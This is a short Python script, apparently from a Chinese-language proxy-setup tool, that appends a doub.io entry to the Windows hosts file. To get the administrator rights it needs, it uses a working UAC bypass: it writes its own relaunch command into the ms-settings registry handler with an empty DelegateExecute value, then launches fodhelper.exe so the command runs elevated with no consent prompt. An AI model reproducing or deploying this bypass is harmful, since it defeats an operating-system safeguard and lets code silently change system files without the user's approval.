# coding=utf-8
from __future__ import print_function
import os
import sys
import ctypes
import logging
import traceback

if sys.version_info[0] == 3:
    import winreg as winreg
else:
    import _winreg as winreg

curr_path = os.path.dirname(os.path.abspath(__file__))
par_path = os.path.abspath(os.path.join(curr_path, os.pardir))
log_path = os.path.abspath(os.path.join(curr_path, os.pardir, os.pardir, os.pardir))
CMD = r"C:\Windows\System32\cmd.exe"
FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD = par_path+"\\python27\\1.0\\python.exe"
REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

LOG_FORMAT = "%(levelname)s - %(asctime)s - %(message)s"
logging.FileHandler(filename=log_path+'\\get_proxy.log', encoding='utf-8')
logging.basicConfig(filename=log_path + '\\get_proxy.log', level=logging.DEBUG, format=LOG_FORMAT)


def is_admin():
    """
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def create_reg_key(key, value):
    """
    Creates a reg key
    """
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        logging.error("bypass_uac:" + traceback.format_exc())


def bypass_uac(cmd):
    """
    Tries to bypass the UAC
    """
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
    except WindowsError:
        logging.error("bypass_uac:"+traceback.format_exc())


def execute():
    if not is_admin():
        print('[!] The script is NOT running with administrative privileges')
        # print('[+] Trying to bypass the UAC')
        try:
            current_dir = __file__
            cmd = '{} /c {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)
            os.system(FOD_HELPER)
            # sys.exit(0)
        except WindowsError:
            logging.error(u"修改host失败")
            print(u"修改host失败")
            sys.exit(1)
    else:
        # 这里添加我们需要管理员权限的代码
        config_file = "C:\\Windows\\System32\\drivers\\etc\\hosts"
        # config_file = "C:\\he\\py_proj_27\\set_proxy\\hosts"
        new_line = "\n104.28.2.6 doub.io\n"
        with open(config_file, mode='a+') as f:
            f.write(new_line)
        logging.info(u"host修改成功")


if __name__ == '__main__':
    execute()
